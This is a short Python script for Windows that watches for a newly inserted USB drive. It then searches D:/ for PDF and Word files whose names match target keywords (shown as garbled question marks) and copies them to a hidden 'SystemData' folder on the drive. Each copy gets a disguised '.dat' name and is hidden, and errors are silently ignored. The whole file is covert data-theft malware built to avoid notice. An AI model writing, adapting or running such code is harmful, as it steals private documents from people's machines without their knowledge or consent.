
import os
import shutil
import string
import time
import ctypes

search_path = "D:/"
target_keywords = ["????? ????", "??????", "????", "?????"]
target_extensions = ['.pdf', '.docx', '.doc']

def detect_usb_drive(prev_drives):
    while True:
        time.sleep(2)
        current_drives = ['%s:' % d for d in string.ascii_uppercase if os.path.exists('%s:\\' % d)]
        new_drives = list(set(current_drives) - set(prev_drives))
        if new_drives:
            return new_drives[0]

def hide_file_or_folder(path):
    FILE_ATTRIBUTE_HIDDEN = 0x02
    try:
        ctypes.windll.kernel32.SetFileAttributesW(str(path), FILE_ATTRIBUTE_HIDDEN)
    except:
        pass

initial_drives = ['%s:' % d for d in string.ascii_uppercase if os.path.exists('%s:\\' % d)]
usb_drive = detect_usb_drive(initial_drives)

dest_folder = os.path.join(usb_drive + "\\", "SystemData")
os.makedirs(dest_folder, exist_ok=True)
hide_file_or_folder(dest_folder)

for root, dirs, files in os.walk(search_path):
    for file in files:
        if any(file.lower().endswith(ext) for ext in target_extensions):
            if any(keyword in file for keyword in target_keywords):
                src = os.path.join(root, file)
                new_name = "data_" + str(int(time.time())) + ".dat"
                dst = os.path.join(dest_folder, new_name)
                try:
                    shutil.copy2(src, dst)
                    hide_file_or_folder(dst)
                except:
                    pass